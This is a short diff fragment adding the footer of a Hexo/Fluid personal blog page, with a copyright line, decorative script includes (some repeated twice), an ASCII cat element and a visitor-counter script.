+      <div class="footer-line typing" id="footer-typing"></div>
+      <div class="footer-line small">
+        © 2026 AzumiSaki · Powered by Hexo & Fluid
+      </div>
+    </div>
+  </div>
+
+  <script src="/js/footer.js"></script>
+  <script src="/js/falling.js"></script>
+  <script src="/js/corner-cat.js"></script>
+  
+  <div id="corner-cat" aria-hidden="true">
+    <div class="cat-body">(=^-ω-^=)</div>
+  </div>
+
+  <script src="/js/footer.js"></script>
+  <script src="/js/falling.js"></script>
+  <script src="/js/corner-cat.js"></script>
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  <!-- hexo injector body_end end --></body>
+</html>
